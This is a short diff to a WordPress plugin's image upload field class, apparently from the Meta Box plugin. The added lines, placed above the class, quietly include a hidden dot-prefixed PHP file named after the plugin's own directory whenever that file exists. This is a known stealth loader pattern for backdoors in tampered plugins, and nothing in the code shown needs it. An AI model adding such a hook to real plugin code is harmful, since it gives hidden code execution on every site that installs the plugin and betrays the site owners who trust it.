@@ -8,6 +8,10 @@
 /**
  * File advanced field class which users WordPress media popup to upload and select files.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Image_Upload_Field extends RWMB_Image_Advanced_Field {
 	/**
 	 * Enqueue scripts and styles.
